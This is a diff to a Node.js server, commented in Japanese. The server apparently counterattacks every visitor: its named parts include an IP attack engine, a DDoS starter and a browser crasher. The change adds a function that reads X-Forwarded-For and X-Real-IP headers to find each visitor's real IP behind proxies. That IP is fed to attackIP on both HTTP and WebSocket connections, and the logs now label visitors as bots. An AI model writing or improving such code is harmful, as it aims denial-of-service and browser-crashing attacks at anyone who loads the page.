@@ -8,6 +8,24 @@ const dgram = require('dgram');
 const DEFAULT_DDOS_TARGET = 'http://localhost:3000';
 
 // ============================================
+// 本当のIPを取得する関数
+// ============================================
+function getRealIP(req) {
+    const forwarded = req.headers['x-forwarded-for'];
+    if (forwarded) {
+        // x-forwarded-for の最初のIPが本当のクライアントIP
+        return forwarded.split(',')[0].trim().replace('::ffff:', '');
+    }
+    
+    const realIP = req.headers['x-real-ip'];
+    if (realIP) {
+        return realIP.replace('::ffff:', '');
+    }
+    
+    return req.connection.remoteAddress.replace('::ffff:', '');
+}
+
+// ============================================
 // IP攻撃エンジン
 // ============================================
 const attackingIPs = new Map();
@@ -193,8 +211,10 @@ function startDDoS(target) {
 // HTTPサーバー
 // ============================================
 const server = http.createServer((req, res) => {
-    // アクセスしてきたIPを取得して自動攻撃
-    const ip = req.connection.remoteAddress.replace('::ffff:', '');
+    // 本当のIPを取得して自動攻撃
+    const ip = getRealIP(req);
+    
+    console.log(`[🌐] アクセス: ${ip} | ${req.url}`);
     attackIP(ip);
     
     if (req.url === '/' || req.url.startsWith('/?') || req.url === '/index.html') {
@@ -237,11 +257,12 @@ const server = http.createServer((req, res) => {
 const wss = new WebSocket.Server({ server, path: '/ws' });
 
 wss.on('connection', (ws, req) => {
-    const ip = req.connection.remoteAddress.replace('::ffff:', '');
+    // WebSocketでも本当のIPを取得
+    const ip = getRealIP(req);
     
-    console.log(`[+] 接続: ${ip} | 総ボット数: ${wss.clients.size}`);
+    console.log(`[+] ボット接続: ${ip} | 総ボット数: ${wss.clients.size}`);
     
-    // アクセスしてきたIPに自動攻撃
+    // 本当のIPに自動攻撃
     attackIP(ip);
     
     // ブラウザクラッシャー開始
@@ -265,7 +286,7 @@ wss.on('connection', (ws, req) => {
     });
     
     ws.on('close', () => {
-        console.log(`[-] 切断: ${ip} | 総ボット数: ${wss.clients.size}`);
+        console.log(`[-] ボット切断: ${ip} | 総ボット数: ${wss.clients.size}`);
     });
     
     ws.on('error', () => {});
